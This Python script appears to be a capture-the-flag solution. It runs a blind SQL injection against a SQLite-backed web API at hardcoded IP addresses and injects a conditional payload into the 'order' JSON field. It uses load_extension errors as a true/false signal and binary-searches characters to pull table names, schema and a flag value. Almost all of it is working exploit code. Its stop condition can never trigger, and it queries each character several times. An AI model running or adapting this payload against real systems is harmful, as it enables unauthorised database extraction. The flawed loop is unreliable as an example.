import requests

#url = "http://192.168.86.250:1337"
url = "http://94.237.59.63:54218"

def sqli(pos, mid):    

    #query = "SELECT sqlite_version()"
    #query = "SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'"
    #query = "SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='flag_20f82eeb82'"
    #query = "SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='flag_33201dce69'"
    query = "SELECT flag FROM flag_33201dce69"
    json = {
        "order": "(select case when (unicode(substr((%s), %i,1)) > %i ) then 1 else load_extension(1) end)" % (query, pos,mid)
    }

    r = requests.post(url + "/api/list", json=json)

    return "Something went wrong" not in r.text

def get_char(pos):
    lo, hi = 32, 128
    while lo <= hi:
        mid = lo + (hi - lo) // 2
        if sqli(pos, mid):
            lo = mid + 1
        else:
            hi = mid - 1
    return chr(lo)


flag = ''
for i in range(1, 300):
    val = get_char(i)
    if flag == flag + get_char(i):
        break
    flag += get_char(i)
    print(flag)

print(flag)